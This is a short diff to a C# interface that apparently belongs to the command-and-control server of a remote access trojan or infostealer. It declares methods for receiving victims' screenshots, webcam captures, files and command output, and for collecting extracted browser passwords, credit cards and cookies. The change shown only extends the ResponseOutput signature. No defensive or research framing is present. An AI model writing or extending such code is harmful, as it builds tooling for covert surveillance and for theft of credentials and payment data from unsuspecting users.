@@ -9,7 +9,7 @@ namespace X_ZIGZAG_SERVER_WEB_API.Interfaces
         public Task StoreScreenshot(string uuid,int ScreenIndex, byte[] imageData);
         public Task StoreWebcam(string uuid,int CameraIndex, byte[] imageData,long instructionId);
         public Task StoreFile(string uuid,long instructionId, IFormFile file);
-        public Task ResponseOutput(string uuid,long instructionId, string ?output);
+        public Task ResponseOutput(string uuid,long instructionId, short Code, string ?output,string ?args);
         public Task BrowserPasswordExtracting(string uuid,long instructionId, byte[] file, byte[] secretKey, string BrowserName);
         public Task BrowserCreditCardExtracting(string uuid,long instructionId, byte[] file, byte[] secretKey, string BrowserName);
         public Task BrowserCookiesExtracting(string uuid,long instructionId, byte[] file, byte[] secretKey, string BrowserName);
